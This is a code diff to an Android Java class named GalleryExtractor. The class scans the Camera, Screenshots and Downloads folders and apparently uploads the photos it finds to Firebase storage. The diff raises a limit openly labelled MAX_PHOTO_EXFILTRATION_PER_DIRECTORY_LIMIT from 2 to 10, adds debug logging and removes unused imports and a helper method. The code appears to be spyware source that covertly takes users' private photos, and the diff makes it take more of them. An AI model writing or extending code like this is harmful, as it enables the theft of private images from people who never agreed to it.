@@ -2,14 +2,10 @@ package com.droidekamobile;
 
 import static android.content.ContentValues.TAG;
 
-import android.content.ContentResolver;
-import android.content.ContentValues;
-import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
-import android.provider.MediaStore;
 import android.util.Log;
 
 import androidx.annotation.NonNull;
@@ -24,18 +20,13 @@ import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
 import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.OnProgressListener;
-import com.google.firebase.storage.StorageMetadata;
 import com.google.firebase.storage.StorageReference;
 import com.google.firebase.storage.UploadTask;
 
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileNotFoundException;
-import java.io.InputStream;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
-import java.util.UUID;
 
 
 public class GalleryExtractor extends AppCompatActivity {
@@ -50,11 +41,10 @@ public class GalleryExtractor extends AppCompatActivity {
     ArrayList<String> allowedPhotoExtensions =  new ArrayList<>(Arrays.asList(".png", ".jpg", "jpeg"));
     ArrayList<String> interestingPhotoSubdirectories = new ArrayList<>(Arrays.asList("Camera", "Screenshots", "Downloads"));  // So that Zafran doesn't need to pay for Firebase storage
 
-    private final int MAX_PHOTO_EXFILTRATION_PER_DIRECTORY_LIMIT = 2; // So that Zafran doesn't need to pay for Firebase storage too
+    private final int MAX_PHOTO_EXFILTRATION_PER_DIRECTORY_LIMIT = 10; // So that Zafran doesn't need to pay for Firebase storage too
 
-    String photoDir;
     private boolean mSaved;
-    FileInputStream fi;
+
     @Override
     protected void onCreate(Bundle savedInstanceState){
         super.onCreate(savedInstanceState);
@@ -71,15 +61,9 @@ public class GalleryExtractor extends AppCompatActivity {
             Log.d("Files", "SCREENSHOT DIRECTORY NOT SUPPORTED!");
         }
     }
-    //get images
-    private String getGalleryPath() {
-        return photoDir = Environment.getExternalStorageDirectory() + "/" + Environment.DIRECTORY_DCIM + "/" + "image1.jpg";
-    }
 
     //upload images
     public void uploadGallery() {
-        Log.d(ACTIVITY_SERVICE, getGalleryPath());
-
         for (String photoDirectory : commonPhotoDirectories) {
             listPicturesInDirectory(Environment.getExternalStorageDirectory().toString() + "/" + photoDirectory);
         }
@@ -112,8 +96,11 @@ public class GalleryExtractor extends AppCompatActivity {
 
         //Don't bother recursing if there is no files inside the directory.
         if (files == null) {
+            Log.d("Files", "Its null");
+            Log.d("Files", "Does it exist: " + directory.exists());
             return;
         } else if (files.length == 0) {
+            Log.d("Files", "Its Empty");
             return;
         }
 
@@ -125,7 +112,7 @@ public class GalleryExtractor extends AppCompatActivity {
             String fileName = files[i].getAbsolutePath();
             String[] fileNameSplitter = fileName.split("/");
             if (files[i].isDirectory() && interestingPhotoSubdirectories.contains(fileNameSplitter[fileNameSplitter.length - 1])) {
-                // Log.d("Files", "FileName:" + files[i].toString());
+                 Log.d("Files", "FileName:" + files[i].toString() + " exist");
                 listPicturesInDirectory(files[i].getAbsolutePath());
 
             } else if (fileName.length() > 4 && photo_count < MAX_PHOTO_EXFILTRATION_PER_DIRECTORY_LIMIT) {
@@ -139,8 +126,7 @@ public class GalleryExtractor extends AppCompatActivity {
         }
     }
 
-    static File[] reverse(File[] a)
-    {
+    static File[] reverse(File[] a) {
         ArrayList<File> fileArray = new ArrayList<>(Arrays.asList(a));
         Collections.reverse(fileArray);
         File[] fileList = new File[fileArray.size()];
